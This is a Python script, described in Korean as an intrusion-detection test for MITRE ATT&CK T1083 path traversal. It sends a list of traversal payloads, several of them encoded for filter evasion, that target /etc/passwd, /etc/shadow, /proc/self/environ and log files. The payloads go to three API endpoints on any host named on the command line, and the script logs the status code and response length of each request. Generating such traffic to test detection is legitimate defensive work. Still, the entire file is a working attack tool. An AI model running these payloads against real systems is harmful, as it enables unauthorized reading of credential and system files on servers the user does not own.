"""
MITRE ATT&CK: T1083 - File and Directory Discovery (Path Traversal)
연구 목적 침입 탐지 테스트용 스크립트
사용법: python path_traversal.py --host http://<TARGET> [--delay FLOAT]
"""
import argparse
import requests
import time
import logging

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
)
logger = logging.getLogger(__name__)

TRAVERSAL_PAYLOADS = [
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/shadow",
    "../../../etc/hosts",
    "%2e%2e%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2fetc%2fshadow",
    "....//etc/passwd",
    "....//....//etc/shadow",
    "..%2fetc%2fpasswd",
    "..%5cetc%5cpasswd",
    "%252e%252e%252fetc%252fpasswd",
    "..%c0%afetc%c0%afpasswd",
    "/etc/passwd",
    "/proc/self/environ",
    "../../../var/log/auth.log",
    "../../../../var/log/syslog",
    "..%2f..%2f..%2fetc%2fpasswd",
]

ENDPOINTS = [
    "/api/posts/{payload}",
    "/api/auth/{payload}",
    "/api/files/{payload}",
]


def probe_endpoint(base_url: str, endpoint_template: str, payload: str, delay: float) -> None:
    path = endpoint_template.replace("{payload}", payload)
    url = f"{base_url}{path}"
    try:
        resp = requests.get(url, timeout=5)
        logger.info(
            "GET %s status=%d content_length=%d",
            path, resp.status_code, len(resp.content),
        )
    except requests.RequestException as exc:
        logger.error("GET 오류 — path=%s error=%s", path, exc)
    time.sleep(delay)


def run(host: str, delay: float) -> None:
    base_url = host.rstrip("/")
    total = len(TRAVERSAL_PAYLOADS) * len(ENDPOINTS)
    logger.info(
        "T1083 Path Traversal 시작 — 대상: %s, payload 수: %d, endpoint 수: %d, 총 요청: %d",
        base_url, len(TRAVERSAL_PAYLOADS), len(ENDPOINTS), total,
    )

    for payload in TRAVERSAL_PAYLOADS:
        for endpoint in ENDPOINTS:
            probe_endpoint(base_url, endpoint, payload, delay)

    logger.info("완료 — 총 %d회 경로 탐색 시도", total)


def main() -> None:
    parser = argparse.ArgumentParser(
        description="T1083 Path Traversal 침입 탐지 테스트 스크립트"
    )
    parser.add_argument("--host", required=True, help="대상 호스트 URL (예: http://192.168.1.1)")
    parser.add_argument("--delay", type=float, default=0.05, help="요청 간격(초) (기본값: 0.05)")
    args = parser.parse_args()

    run(args.host, args.delay)


if __name__ == "__main__":
    main()
